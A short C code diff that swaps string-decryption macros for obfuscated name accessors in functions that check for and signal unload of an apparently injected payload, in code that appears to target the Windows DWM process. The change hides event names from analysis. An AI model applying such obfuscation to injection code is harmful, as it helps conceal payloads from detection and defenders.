@@ -16,6 +16,7 @@
 #include "../../shared/log_secure.h"
 #include "../../shared/lazy_api.h"
 #include "../../shared/str_enc.h"
+#include "../../shared/obf_names.h"
 
 #include <tlhelp32.h>
 #include <stdio.h>
@@ -133,16 +134,16 @@ unsigned long inject_find_dwm_pid(void) {
  * negative there but that's fine (payload is already tearing down).
  *
  * NOTE: `SVC_SHUTDOWN_EVENT_NAME` matches BOTH sides -- see
- * `shared/common.h` and `shared/str_enc.c` (SS(SVC_STR_SHUTDOWN_EVENT)). */
+ * `shared/common.h` and `shared/str_enc.c` (obf_event_shutdown()). */
 int inject_is_loaded(void) {
-    HANDLE ev = OpenEventA(SYNCHRONIZE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
+    HANDLE ev = OpenEventA(SYNCHRONIZE, FALSE, obf_event_shutdown());
     if (!ev) return 0;
     CloseHandle(ev);
     return 1;
 }
 
 int inject_signal_unload(void) {
-    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
+    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, obf_event_shutdown());
     if (!ev) return 0;
     SetEvent(ev); CloseHandle(ev);
     return 1;
